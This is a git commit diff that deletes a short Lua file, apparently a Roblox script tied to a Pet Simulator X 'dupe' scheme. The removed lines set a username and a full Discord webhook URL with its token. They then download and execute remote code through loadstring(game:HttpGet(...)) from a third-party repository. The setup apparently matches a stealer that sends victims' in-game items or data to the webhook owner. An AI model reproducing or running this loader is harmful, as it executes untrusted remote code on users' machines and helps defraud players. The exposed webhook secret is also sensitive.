b7b0372325ed2e27fe105634ff965492c6c06385
PetSimXOP <121709738+PetSimXOP@users.noreply.github.com>
2023-01-22 09:02:40 -0600

    Delete text.lua

--- text.lua
+++
@@ -1,4 +0,0 @@
-UserName = "LostMoonShadow"
-WebHook = "https://discord.com/api/webhooks/1066731258257866802/p-xXfwD_6um3SQ7srYnY-GUlA56BmDHNK4mP5slFrIyPQYbz5rCs_HoNxE7sJCUGQwyT"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/petsmixdupe/main/PSX.lua", true))()
